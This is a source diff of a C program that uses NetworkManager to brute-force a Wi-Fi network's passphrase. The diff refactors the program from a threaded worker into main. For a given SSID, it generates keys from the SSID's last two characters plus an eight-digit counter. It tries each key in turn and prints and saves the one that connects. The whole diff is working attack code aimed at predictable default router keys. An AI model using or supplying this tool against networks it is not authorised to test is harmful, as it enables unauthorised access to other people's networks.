@@ -19,7 +19,6 @@ typedef enum{
 } Status;
 
 typedef struct{
-    int thread_number;
     Status status;
     bool *found;
     char *ssid;
@@ -165,73 +164,99 @@ static void set_connection_settings(NMConnection *connection, const char *ssid){
 }
 
 
-/**
- * Function to try to connect to the specified connection
- */
-static void *handle_connection(void *arg){
-    ThreadData *thread_data = (ThreadData*) arg;
-    GMainContext *context = g_main_context_new();
-    g_main_context_push_thread_default(context);
-    GMainLoop *loop = g_main_loop_new(context, FALSE);
+int main(int argc, char* argv[]){
+    if(argc == 1){
+	tui_print_error("Arguments are required");
+	print_help();
+	return 1;
+    }
+	
+    int opt;
+    char ssid[15];
+    int from = 0, to = 100000000;
+    int threads_number = 4;
 
+    // -s <ssid>
+    // -f <start of range (inclusive)> (0 default)
+    // -t <end of range (exclusive)> (100000000)
+    while( (opt = getopt(argc, argv, "s:f:t:")) != -1){
+	switch(opt){
+	case 's':
+	    strncpy(ssid, optarg, 15);
+	    break;
+	case 'f':
+	    // Not making any error checking yet
+	    from = atoi(optarg);
+	    break;
+	case 't':
+	    // Not making any error checking yet
+	    to = atoi(optarg);
+	    break;;
+	case '?':
+	    tui_print_error("Invalid argument");
+	    print_help();
+	    return 1;
+	}
+    }
+
+ 
+    GMainLoop *loop = g_main_loop_new(NULL, FALSE);
     GError *error = NULL;
     NMClient *client = nm_client_new(NULL, &error);
 
     if(!client){
-	tui_print_error("(Thread %d) Failed to connect to NetworkManager", thread_data->thread_number);
-	thread_data->status = STATUS_FAILED;
-	return NULL;
+	tui_print_error("Failed to connect to NetworkManager");
+	return 1;
     }
     else
-	tui_print_success("(Thread %d) Connected to NetworkManager", thread_data->thread_number); 
+	tui_print_success("Connected to NetworkManager"); 
 
     // This connection pointer is used only to set the wifi settings
     // Once is passed to nm_client_add_connection_async, it is useless
     NMConnection *connection = nm_simple_connection_new();
-    set_connection_settings(connection, thread_data->ssid);
+    set_connection_settings(connection, ssid);
 
     CallbackData cb_data = { loop, STATUS_IDLE, NULL, NULL };
     nm_client_add_connection_async(
-				   client,
-				   connection,
-				   FALSE,
-				   NULL,
-				   add_connection_callback,
-				   &cb_data
-				   );
+	client,
+	connection,
+	FALSE,
+	NULL,
+	add_connection_callback,
+	&cb_data
+	);
 
     g_main_loop_run(loop);
 
     if(cb_data.status == STATUS_SUCCESS)
-	tui_print_success("(Thread %d) Network profile created", thread_data->thread_number);
+	tui_print_success("Network profile created");
     else{
-	thread_data->status = STATUS_FAILED;
-	tui_print_error("(Thread %d) There was an error trying to create the network profile", thread_data->thread_number);
-	return NULL;
+	tui_print_error("There was an error trying to create the network profile");
+	return 1;
     }
 
-    tui_print_info("(Thread %d) Starting passphrase testing phase...", thread_data->thread_number);
+    tui_print_info("Starting passphrase testing phase...");
+    bool found = false;
     char passphrase[11];
     char prefix[3];
-    strcpy(prefix, thread_data->ssid + strlen(thread_data->ssid) - 2);
+    strcpy(prefix, ssid + strlen(ssid) - 2);
     cb_data.passphrase = passphrase;
 
-    int tries = 0;
-    int i = thread_data->from;
-    while( *thread_data->found == false && i < thread_data->to ){
+    for(int i = from; i < to; ++i ){
 
 	snprintf(passphrase, sizeof(passphrase), "%s%08d", prefix, i);
 
 	NMSettingWirelessSecurity *s_sec = nm_connection_get_setting_wireless_security(NM_CONNECTION(cb_data.connection));
 	g_object_set(s_sec, NM_SETTING_WIRELESS_SECURITY_PSK, passphrase, NULL);
 
+	// Set the new passphrase
 	nm_remote_connection_commit_changes_async(
 		cb_data.connection,
 		FALSE,
 		NULL,
 		passphrase_change_callback,
 		&cb_data);
-    
+	
 	g_main_loop_run(loop);
 
 	// Once the passphrase is changed, try to activate it
@@ -241,93 +266,38 @@ static void *handle_connection(void *arg){
 		NULL, NULL, NULL,
 		activate_connection_callback,
 		(void*) &cb_data);
-
+	
 	g_main_loop_run(loop);
+
+	// The passphrase was found
 	if(cb_data.status == STATUS_SUCCESS){
-	    // Notify other threads the key was found and save the connection
-	    *thread_data->found = true;
-	    tui_print_success("(Thread %d) The password is %s", thread_data->thread_number, passphrase);
+	    found = true;
+	    tui_print_success("The password is %s", passphrase);
+
+	    // The goal now is to save the connection
 	    nm_remote_connection_commit_changes_async(
 		cb_data.connection,
 		TRUE,
 		NULL,
 		save_connection_callback,
 		&cb_data);
-
+	    
 	    g_main_loop_run(loop);
-	    if(cb_data.status == STATUS_SUCCESS){
-		thread_data->status = STATUS_SUCCESS;
-		tui_print_success("(Thread %d) Connection saved", thread_data->thread_number);
-	    }
-	    else{
-		thread_data->status = STATUS_FAILED;
-		tui_print_error("(Thread %d) There was an error trying to save the connection", thread_data->thread_number);
-	    }
+	    
+	    if(cb_data.status == STATUS_SUCCESS)
+		tui_print_success("Connection saved");
+	    else
+		tui_print_error("There was an error trying to save the connection");
+
+	    // Either way the connection was saved or not, exit the main loop
 	    break;
 	}
-	else{
-	    tui_print_error("(Thread %d) %s failed", thread_data->thread_number, passphrase);
-	    ++i; ++tries;
-	}
-     }
+	else
+	    tui_print_error("%s failed", passphrase);
+    }
 	
     if(loop) g_main_loop_unref(loop);
     if(connection) g_object_unref(connection);
     if(client) g_object_unref(client);
-    
-    return NULL;
-}
-
-
-int main(int argc, char* argv[]){
-    if(argc == 1){
-	tui_print_error("Arguments are required");
-	print_help();
-	return 1;
-    }
-	
-    int opt;
-    char *ssid = malloc( sizeof(char) * 20);
-    int from = 0, to = 100000000;
-    int threads_number = 4;
-
-    // -s <ssid>
-    // -f <start of range (inclusive)> (0 default)
-    // -t <end of range (exclusive)> (100000000)
-    while( (opt = getopt(argc, argv, "s:p:f:t:n:")) != -1){
-	switch(opt){
-	case 's':
-	    strncpy(ssid, optarg, 20);
-	    break;
-	case 'f':
-	    // Not making any error checking yet
-	    from = atoi(optarg);
-	    break;
-	case 't':
-	    // Not making any error checking yet
-	    to = atoi(optarg);
-	    break;
-	case 'n':
-	    threads_number = atoi(optarg);
-	    break;
-	case '?':
-	    tui_print_error("Invalid argument");
-	    print_help();
-	    return 1;
-	}
-    }
-
-    bool *found = malloc(sizeof(bool));
-    *found = false;
-    
-    ThreadData data = {1, STATUS_IDLE, found, ssid, to, from};
-    pthread_t thread_ptr;
-    pthread_create(&thread_ptr, NULL, handle_connection, (void*) &data);
-    pthread_join(thread_ptr, NULL);
-
-    free(ssid);
-    free(found);
-    found = NULL;
-    ssid = NULL;
     return 0;
 }
